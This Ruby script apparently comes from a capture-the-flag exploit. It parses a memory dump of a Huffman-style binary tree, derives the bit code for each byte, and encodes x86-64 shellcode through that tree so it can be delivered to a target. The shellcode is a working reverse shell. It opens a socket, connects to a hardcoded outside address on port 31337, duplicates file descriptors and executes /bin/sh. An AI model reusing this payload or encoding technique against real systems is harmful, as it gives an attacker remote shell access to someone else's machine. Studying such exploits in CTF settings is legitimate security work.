file = File.open('./tree-output.txt', 'r').read()

ROOT = 0x60e050

STARTING_ADDR = file.split(/:/, 2).shift.to_i(16)
puts("Starting address: 0x%08x" % STARTING_ADDR)

def get_node(addr)
  node = {}
  node[:addr]  = addr
  node[:left]  = @@qwords[addr + 0x00]
  node[:right] = @@qwords[addr + 0x08]
  node[:value] = @@dwords[addr + 0x10]
  node[:count] = @@dwords[addr + 0x1c]

  return node
end

@@qwords = {}
@@dwords = {}

file.split(/\n/).each do |line|
  if(line =~ /Cannot/)
    break
  end

  # Remove the address
  addr, data = line.split(/:\s/, 2)
  addr = addr.to_i(16)

  data.gsub!(/0x/, '')
  data.gsub!(/[^a-fA-F0-9]/, '')

  qword = [data].pack("H*").unpack("Q").pop
  dword1 = qword & 0x0FFFFFFFF
  dword2 = (qword >> 32) & 0x0FFFFFFFF

  @@qwords[addr] = qword
  @@dwords[addr] = dword1
  @@dwords[addr+4] = dword2
end

node = get_node(ROOT)

def print_node(node)
  puts("[0x%08x] :: Left => 0x%08x :: Right => 0x%08x :: Value => 0x%02x :: Count => 0x%04x" % [node[:addr], node[:left], node[:right], node[:value], node[:count]])
end

@@seqs = {}
def walk_nodes(addr, seq = "")
  node = get_node(addr)
  #print_node(node)

  if(node[:left] != 0)
    walk_nodes(node[:left], seq + "0")
  end

  if(node[:right] != 0)
    walk_nodes(node[:right], seq + "1")
  end

  if(node[:left] == 0)
    @@seqs[node[:value]] = seq
  end
end

walk_nodes(ROOT)

@@seqs.each_pair do |i, j|
  puts "%s => %s" % [i, j]
end
exit
#@@seqs.each_pair do |k, v|
#  puts("0x%02x => %s" % [k, v])
#end

IPADDR  = "\xce\xdc\xc4\x3b" # 206.220.196.59
PORT    = "\x7a\x69" # 31337

SHELLCODE = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" +
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" +
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" +
"\x02" + PORT + "\xc7\x44\x24\x04" + IPADDR + "\x48\x89\xe6\x6a\x10" +
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" +
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" +
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" +
"\x5f\x6a\x3b\x58\x0f\x05"

tree_code = ""

SHELLCODE.split(//).each do |c|
  tree_code += @@seqs[c.ord]
end

while((tree_code.length % 8) != 0) do
  tree_code += '0'
end
tree_code = [tree_code].pack("B*")
tree_code = [tree_code.length].pack("I") + tree_code
tree_code.split(//).each do |b|
  print('\x%02x' % b.ord)
end
puts()
# 1010 1001 1100 0000

